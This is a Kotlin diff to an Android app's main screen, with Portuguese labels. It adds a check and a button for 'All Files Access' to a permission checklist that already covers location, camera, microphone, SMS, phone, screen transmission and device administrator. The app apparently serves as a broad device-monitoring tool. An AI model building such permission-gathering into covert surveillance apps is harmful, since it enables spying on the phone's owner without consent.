@@ -245,6 +245,8 @@ class MainActivity : ComponentActivity() {
         val hasPhone      by hasPhoneState
         val hasSms        by hasSmsState
         val hasActivity   by hasActivityState
+        val hasAllFiles   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
+            android.os.Environment.isExternalStorageManager() else true
 
         // Auto-start service on first compose
         LaunchedEffect(Unit) {
@@ -431,12 +433,28 @@ class MainActivity : ComponentActivity() {
                 }
                 PermRow("Transmissão de Tela", hasScreen)
                 PermRow("Administrador do Dispositivo", hasAdmin)
+                PermRow("Acesso a Todos os Arquivos", hasAllFiles)
 
                 val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
-                        hasPhone && hasSms && hasActivity && hasNotify && hasScreen && hasAdmin
+                        hasPhone && hasSms && hasActivity && hasNotify && hasScreen && hasAdmin && hasAllFiles
                 Spacer(Modifier.height(14.dp))
 
                 if (!allGranted) {
+                    // Manage all files (Android 11+)
+                    if (!hasAllFiles && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        Button(
+                            onClick = {
+                                startActivity(Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
+                            },
+                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
+                            shape = RoundedCornerShape(12.dp),
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                        ) {
+                            Text("📂  Permitir Acesso a Todos os Arquivos", color = Color(0xFF0A0B10),
+                                fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                        }
+                    }
+
                     // Device Admin activation button (separate system flow)
                     if (!hasAdmin) {
                         Button(
